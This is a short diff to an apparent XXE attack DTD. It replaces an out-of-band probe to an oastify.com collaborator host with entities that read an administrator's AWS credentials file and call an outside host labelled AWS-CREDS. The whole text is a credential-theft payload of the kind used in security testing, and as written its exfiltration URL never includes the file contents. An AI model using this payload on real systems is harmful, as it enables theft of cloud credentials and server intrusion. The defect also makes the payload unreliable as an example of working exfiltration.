@@ -1,2 +1,4 @@
-<!ENTITY % test SYSTEM "http://SUCCESS.oogwarjxrsupc30af0k5w3uzuq0johc6.oastify.com/">
-%test;
+<!ENTITY % file SYSTEM "file:///c:/users/administrator/.aws/credentials">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://AWS-CREDS.oogwarjxrsupc30af0k5w3uzuq0johc6.oastify.com/'>">
+%eval;
+%exfil;
